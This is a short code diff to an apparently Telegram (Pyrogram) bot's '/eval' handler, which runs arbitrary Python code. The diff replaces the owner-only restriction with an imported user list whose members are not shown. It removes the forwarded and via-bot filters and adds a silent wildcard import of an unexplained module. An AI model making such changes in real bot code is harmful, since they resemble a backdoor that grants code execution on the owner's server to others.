@@ -10,7 +10,7 @@ from time import time
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
-from SYSTUM import app
+from SYSTUM import app, sudomfs, nx
 from config import OWNER_ID
 
 
@@ -28,18 +28,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
 
-@app.on_edited_message(
-    filters.command("eval")
-    & filters.user(OWNER_ID)
-    & ~filters.forwarded
-    & ~filters.via_bot
-)
-@app.on_message(
-    filters.command("eval")
-    & filters.user(OWNER_ID)
-    & ~filters.forwarded
-    & ~filters.via_bot
-)
+@app.on_message(filters.command("eval") & filters.user(sudomfs))
 async def executor(client: app, message: Message):
     if len(message.command) < 2:
         return await edit_or_reply(message, text="<b>ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴɴᴀ ᴇxᴇᴄᴜᴛᴇ ʙᴀʙʏ ?</b>")
@@ -47,6 +36,8 @@ async def executor(client: app, message: Message):
         cmd = message.text.split(" ", maxsplit=1)[1]
     except IndexError:
         return await message.delete()
+    try: from Nexgram import *
+    except: pass
     t1 = time()
     old_stderr = sys.stderr
     old_stdout = sys.stdout
